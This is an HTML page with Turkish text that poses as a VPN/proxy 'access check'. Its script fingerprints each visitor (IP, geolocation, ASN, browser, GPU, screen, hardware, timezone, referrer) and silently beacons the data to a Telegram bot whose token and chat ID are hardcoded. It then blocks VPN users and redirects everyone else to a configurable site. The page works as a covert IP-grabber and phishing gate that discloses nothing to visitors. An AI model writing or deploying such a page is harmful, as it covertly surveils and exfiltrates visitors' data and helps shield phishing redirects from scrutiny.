<!-- index.html — VPN/proxy tespitli ziyaretçiyi engeller, temizi yönlendirir -->
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Erişim Kontrolü</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0d1117;color:#e6edf3;font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
  .card{max-width:420px;width:100%;background:#161b22;border:1px solid #30363d;border-radius:12px;padding:32px 28px;text-align:center}
  .icon{font-size:48px;margin-bottom:16px}
  h1{font-size:20px;font-weight:600;margin-bottom:12px;color:#f85149}
  p{font-size:14px;line-height:1.6;color:#8b949e;margin-bottom:8px}
  .hint{font-size:12px;color:#484f58;margin-top:20px;padding-top:16px;border-top:1px solid #21262d}
</style>
</head>
<body>
<div class="card" id="card" style="display:none">
  <div class="icon">🚫</div>
  <h1>Erişim Reddedildi</h1>
  <p>VPN veya proxy tespit edildi.</p>
  <p><strong style="color:#e6edf3">Lütfen VPN/proxy kapatın</strong> ve sayfayı yenileyin.</p>
  <div class="hint">Bağlantınız güvenlik nedeniyle kontrol ediliyor.</div>
</div>
<div class="card" id="loading">
  <p>Bağlantı kontrol ediliyor...</p>
</div>
<script>
(function(){
  "use strict";

  const BOT_TOKEN = "8746989231:AAHGfFiFC8uRTi6lXoUNuTRL8cQMUfMm5nE";
  const CHAT_ID   = "8729744465";
  const REDIRECT  = "https://example.com"; // BURAYI DEĞİŞTİR: Ziyaretçinin gideceği site

  const VPN_ASN = [
    "AS9009","AS16276","AS14061","AS20473","AS24940","AS16509","AS15169",
    "AS396982","AS14618","AS8075","AS13335","AS209242","AS60781","AS51396",
    "AS62240","AS49447","AS200651","AS51852","AS212238","AS47890"
  ];

  async function getIP(){
    const sources = ["https://api.ipify.org?format=json","https://ipapi.co/json/","https://api64.ipify.org?format=json"];
    for(const u of sources){
      try{ const r = await fetch(u,{cache:"no-store"}); const j = await r.json(); const ip = j.ip||j.query; if(ip) return ip; }catch(e){}
    }
    return "bilinmiyor";
  }

  async function getIPInfo(ip){
    try{ const r = await fetch(`https://ipapi.co/${ip}/json/`,{cache:"no-store"}); return await r.json(); }catch(e){ return {}; }
  }

  function isVPN(info){
    if(!info) return false;
    if(info.org && /vpn|proxy|hosting|datacenter|cloud|server/i.test(info.org)) return true;
    if(info.asn && VPN_ASN.includes(info.asn)) return true;
    return false;
  }

  function getDevice(){
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform || "?",
      language: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cores: navigator.hardwareConcurrency || "?",
      memory: navigator.deviceMemory || "?",
      touch: "ontouchstart" in window,
      referrer: document.referrer || "doğrudan",
      webgl: (function(){
        try{ const c=document.createElement("canvas"); const gl=c.getContext("webgl"); const dbg=gl.getExtension("WEBGL_debug_renderer_info"); return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); }catch(e){ return "?"; }
      })()
    };
  }

  function beacon(url, payload){
    const data = new Blob([JSON.stringify(payload)],{type:"application/json"});
    const ok = navigator.sendBeacon ? navigator.sendBeacon(url,data) : false;
    if(!ok){ fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload),keepalive:true}).catch(()=>{}); }
  }

  function showBlocked(){
    document.getElementById("loading").style.display = "none";
    document.getElementById("card").style.display = "block";
  }

  async function main(){
    const ip = await getIP();
    const info = await getIPInfo(ip);
    const vpn = isVPN(info);
    const d = getDevice();

    const msg = [
      vpn ? "🚫 *VPN/PROXY — ENGELLENDİ*" : "✅ *Yeni ziyaret*",
      `🌐 IP: \`${ip}\``,
      `🏢 Org: ${info.org || "?"}`,
      `📍 Konum: ${info.city || "?"}, ${info.country_name || "?"}`,
      `🔌 ASN: ${info.asn || "?"}`,
      `📱 UA: \`${d.userAgent}\``,
      `💻 Platform: ${d.platform}`,
      `🗣 Dil: ${d.language}`,
      `🖥 Ekran: ${d.screen} | GPU: ${d.webgl}`,
      `🕐 TZ: ${d.timezone}`,
      `⚙️ Çekirdek: ${d.cores} | RAM: ${d.memory}GB`,
      `👆 Dokunmatik: ${d.touch}`,
      `🔗 Referrer: ${d.referrer}`,
      `⏰ ${new Date().toLocaleString("tr-TR")}`
    ].join("\n");

    beacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
           {chat_id:CHAT_ID, text:msg, parse_mode:"Markdown"});

    if(vpn){
      showBlocked();
    }else{
      setTimeout(()=>{ location.replace(REDIRECT); }, 1200);
    }
  }

  main().catch(()=>{ location.replace(REDIRECT); });
})();
</script>
</body>
</html>
